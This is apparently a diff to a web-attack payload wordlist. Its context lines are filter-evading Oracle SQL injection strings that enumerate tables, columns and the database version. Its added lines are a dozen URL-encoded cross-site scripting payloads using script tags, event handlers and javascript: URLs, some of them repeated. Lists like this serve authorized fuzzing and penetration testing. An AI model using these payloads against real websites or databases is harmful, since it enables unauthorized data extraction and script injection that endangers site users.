@@ -196,3 +196,15 @@ Oracle/**/1'/**/UNIoN/**/sElEct/**/NULL,/**/User/**/FROM/**/dual/**/ --/**/#
 1'/**/UNiOn/**/ SeLeCt/**/table_name,/**/column_name/**/fROM/**/ all_tab_columns/**/ --/**/--
 1'/**/uniON/**/sELECT/**/
 1,/**/	banner/**/	fROm/**/v$vERsIOn/**/--/**/
+%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E
+%3Csvg/onload%3Dalert%28%27XSS%27%29%3E
+%27%22%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3E
+%3Cinput%20autofocus%20onfocus%3Dalert%281%29%3E
+%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E
+%3Csvg/onload%3Dalert%28%27XSS%27%29%3E
+%3Ciframe%20src%3D%27javascript%3Aalert%28%22XSS%22%29%27%3E%3C/iframe%3E
+%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E
+%3Cinput%20type%3D%27text%27%20value%3D%27XSS%27%20onfocus%3D%27alert%281%29%27%3E
+%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3EClick%20me%3C/a%3E
